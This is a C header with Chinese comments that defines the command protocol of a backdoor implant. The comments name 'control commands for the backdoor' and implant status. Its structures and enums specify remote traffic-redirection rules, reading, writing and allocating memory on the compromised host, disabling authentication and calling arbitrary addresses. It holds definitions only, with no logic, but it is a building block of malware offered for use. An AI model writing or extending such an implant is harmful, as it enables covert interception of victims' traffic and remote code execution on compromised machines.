#ifndef PROTOCOL_H_INCLUDED
#define PROTOCOL_H_INCLUDED

enum _protocol_type_
{
    PROTO_CONTROL = 1,      //对后门的控制命令
    PROTO_REPO_STAT,        //返回的命令执行状态
    PROTO_FRAG,             //一组分片报文
};
typedef struct _Protocol_Header_
{
    char key[20];                   //通讯KEY
    unsigned char type;             //上层协议类型
    unsigned short payload_len;     //携带载荷长度
}PROTO_HDR;

//////////////////////////////////////////////////////////////////////////////////////////
enum _fragment_protocol_type_
{
    FRAG_PROTO_OPER_MEM = 1,
    FRAG_PROTO_REDIR_FLOW,
};
typedef struct _Packet_Fragment_Header_
{
    unsigned char type;             //上层协议类型
    unsigned int sequence;          //此组分片报文序列号
    unsigned short id;              //当前分片报文ID
    unsigned char fin_flag;         //分片结束标识
    unsigned short payload_len;     //携带载荷长度
}PKT_FRAG_HDR;

//////////////////////////////////////////////////////////////////////////////////////////
typedef struct _Redirect_Flow_Header_
{
    unsigned int sequence;          //当前重定向报文序列号
    unsigned short payload_len;     //携带载荷长度
}REDIR_HDR;

//////////////////////////////////////////////////////////////////////////////////////////
enum _send_via_protocol_
{
    USE_IP = 1,
    USE_UDP,
    USE_TCP,
};
enum _cap_protocol_type_
{
    CAP_PROTO_IP = 1,
    CAP_PROTO_TCP,
    CAP_PROTO_UDP,
};
typedef struct _Capture_Rule_
{
    unsigned int id;

    unsigned char proto;
    unsigned int src_ip;
    unsigned int src_mask;
    unsigned short src_port;
    unsigned int dest_ip;
    unsigned int dest_mask;
    unsigned short dest_port;

    unsigned char send_proto;   //传输重定向流量使用的协议。0:ip   1:udp
    unsigned int send_dest_ip;
    unsigned short send_dest_port;
    unsigned int send_src_ip;
    unsigned short send_src_port;
}CAP_RULE;

//////////////////////////////////////////////////////////////////////////////////////////
typedef struct _Operation_Memory_Header_
{
    int address;
    int size;
    unsigned short payload_len;
}OPER_MEM_HDR;

//////////////////////////////////////////////////////////////////////////////////////////
enum _control_type_
{
    CONTROL_FETCH_STATUS = 1,   //获取后门植入状态
    CONTROL_SET_REDIR_RULE,     //设置流量重定向规则
    CONTROL_FETCH_REDIR_RULE,   //获取已设置的重定向规则
    CONTROL_DEL_REDIR_RULE,     //删除重定向规则
    CONTROL_ALLOC_MEM,          //申请内存
    CONTROL_FREE_MEM,           //释放内存
    CONTROL_RD_MEM,             //读取内存
    CONTROL_WR_MEM,             //写内存
    CONTROL_DIS_AUTH,           //取消认证
    CONTROL_EN_AUTH,            //启用认证
    CONTROL_CALL_ADDR,          //调用地址
};
typedef struct _Control_Command_
{
    unsigned char type;         //控制命令类型
    union
    {
        CAP_RULE capture_rule;       //流量重定向规则
        OPER_MEM_HDR operate_mem;    //内存操作命令
    };
}CONTROL_CMD;

//////////////////////////////////////////////////////////////////////////////////////////
typedef struct _Report_Status_
{
    unsigned char type;     //报告类型
    int status_code;        //状态码
    char msg[20];
}REPO_STAT;

#endif // PROTOCOL_H_INCLUDED
